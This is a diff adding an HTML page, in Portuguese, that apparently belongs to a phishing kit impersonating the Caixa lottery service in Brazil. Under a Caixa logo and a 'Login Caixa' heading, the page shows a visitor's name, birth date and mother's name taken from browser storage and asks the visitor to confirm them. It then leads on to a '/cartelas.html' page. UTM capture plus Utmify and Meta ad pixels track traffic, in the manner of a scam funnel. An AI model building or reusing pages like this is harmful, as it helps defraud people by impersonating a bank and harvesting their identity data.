@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="pt-br">
+  <head>
+    <script>
+    // Captura os UTMs assim que a página carregar
+    document.addEventListener('DOMContentLoaded', function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParams = {
+        utm_source: urlParams.get('utm_source') || null,
+        utm_medium: urlParams.get('utm_medium') || null,
+        utm_campaign: urlParams.get('utm_campaign') || null,
+        utm_content: urlParams.get('utm_content') || null,
+        utm_term: urlParams.get('utm_term') || null,
+        src: urlParams.get('src') || null,
+        sck: urlParams.get('sck') || null
+      };
+      localStorage.setItem('utmParams', JSON.stringify(utmParams));
+      console.log('UTMs capturados:', utmParams); // Debug
+    });
+  </script>
+  <script>
+  window.pixelId = "6760fb4642265904392e3638";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1072891304206368');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1072891304206368&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loterias Online</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+
+    <style>
+      @font-face {
+        font-family: 'Futura-Book';
+        src: url('/2/fonts/Futura-Book.eot');
+        src: url('/2/fonts/Futura-Book.eot#iefix') format('embedded-opentype'),
+             url('/2/fonts/Futura-Book.woff2') format('woff2'),
+             url('/2/fonts/Futura-Book.woff') format('woff'),
+             url('/2/fonts/Futura-Book.ttf') format('truetype'),
+             url('/2/images/Futura-Book.svg#Futura-Book') format('svg');
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      body {
+        font-family: 'Futura-Book' !important;
+      }
+
+      .container-bg {
+        background: linear-gradient(45deg, #00a9ad, #005ca9);
+        background-size: 100%;
+        background-repeat: no-repeat;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .container-principal {
+        height: auto;
+        margin: 0 auto;
+        background-color: white;
+        width: 450px;
+        max-width: 95%;
+        color: black;
+        background-color: #fff !important;
+        border-radius: .4rem;
+        box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+        padding: 3rem 4rem;
+      }
+
+      @media (max-width: 576px) {
+        .container-principal {
+          padding: 3rem 2rem !important;
+        }
+      }
+
+      .container-principal img {
+        width: 150px;
+      }
+
+      .container-principal h1 {
+        color: #0070ae;
+        font-size: 1rem;
+        margin-top: .4rem;
+      }
+
+      .container-principal h2 {
+        color: #4d7880;
+        font-size: 1.1rem;
+        margin-top: 1rem;
+        margin-bottom: .5rem;
+        width: 100%;
+        text-align: justify;
+      }
+
+      .container-principal h3 {
+        color: #0070ae;
+        font-size: 1rem;
+        margin-top: 1.1rem;
+      }
+
+      .container-principal h3 a {
+        color: #0070ae;
+        font-weight: 600;
+      }
+
+      .container-principal form {
+        width: 100%;
+        display: flex;
+        justify-content: start;
+        color: #4d7880;
+        font-size: 1.1rem;
+        margin-top: .4rem;
+      }
+
+      .container-principal form label {
+        margin-left: .4rem;
+      }
+
+      .botoes {
+        margin-top: 1rem;
+      }
+
+      .botoes a {
+        width: 100%;
+      }
+
+      .botoes button {
+        background-color: #f39200;
+        color: white;
+        font-weight: 500;
+        width: 100%;
+        border: none;
+        padding: .5rem 1rem;
+        font-size: 1rem;
+        border-radius: .2rem;
+        margin-bottom: .6rem
+      }
+
+      .botoes button:hover {
+        background-color: #173e68;
+      }
+
+      button.btn-nao {
+        background-color: transparent !important;
+        border: solid 2px #f39200;
+        color: #f39200;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container-bg">
+      <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+        <img src="/2/images/logo-caixa.webp" alt="">
+        <h1>Login Caixa</h1>
+        <h2>Para continuar, confirme se os seus dados estão corretos.</h2>
+
+        <h2>Nome:</h2>
+        <form>
+          <input type="radio" checked>
+          <label id="nomeLabel">Carregando...</label><br>
+        </form>
+
+        <h2>Data de nascimento:</h2>
+        <form>
+          <input type="radio" checked disabled>
+          <label id="nascimentoLabel">Carregando...</label><br>
+        </form>
+
+        <h2>Nome da mãe:</h2>
+        <form>
+          <input type="radio" checked disabled>
+          <label id="nome_maeLabel">Carregando...</label><br>
+        </form>
+
+        <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
+          <a href="/cartelas.html"><button>Sim, sou eu</button></a>
+          <a href="../1"><button class="btn-nao">Quero alterar meus dados</button></a>
+        </div>
+
+        <h3><a href="">Preciso de ajuda</a></h3>
+      </div>
+    </div>
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        const nome = localStorage.getItem('nome');
+        const nascimento = localStorage.getItem('nascimento');
+        const nome_mae = localStorage.getItem('nome_mae');
+
+        if (nome) {
+          document.getElementById('nomeLabel').textContent = nome;
+        }
+
+        if (nascimento) {
+          document.getElementById('nascimentoLabel').textContent = nascimento;
+        }
+
+        if (nome_mae) {
+          document.getElementById('nome_maeLabel').textContent = nome_mae;
+        }
+      });
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+  </body>
+</html>
